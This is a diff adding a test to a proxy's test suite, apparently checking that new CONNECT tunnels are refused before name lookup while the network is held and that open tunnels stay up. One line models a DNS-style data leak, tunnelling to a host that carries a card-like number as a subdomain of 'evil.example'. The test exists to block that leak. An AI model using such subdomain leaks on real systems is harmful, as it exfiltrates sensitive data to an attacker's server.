@@ -36,6 +36,20 @@ test('tunnels CONNECT, then cut closes every tunnel and refuses new ones', async
   assert.match(again.answer, /^HTTP\/1\.1 502/);
 });
 
+test('while the probe holds the network, new tunnels are refused before their names are looked up; open ones stay', async (t) => {
+  const echo = echoServer();
+  const port = await listen(echo.server);
+  // The host rule stands in for name resolution: without the hold, this tunnel would be opened.
+  const proxy = await startProxy({ rules: [{ pattern: '*.evil.example', target: '127.0.0.1' }] });
+  t.after(async () => { await proxy.close(); echo.server.close(); });
+  const open = await connect(proxy.port, `127.0.0.1:${port}`);
+  proxy.hold();
+  const leak = await connect(proxy.port, `4111111111111111.evil.example:${port}`);
+  assert.match(leak.answer, /^HTTP\/1\.1 502/);
+  open.socket.write('still');
+  assert.equal(await nextData(open.socket), 'still');
+});
+
 test('data written after the cut never reaches the server', async (t) => {
   const received = [];
   const server = net.createServer((s) => { s.on('data', (d) => received.push(d.toString())); s.on('error', () => {}); });
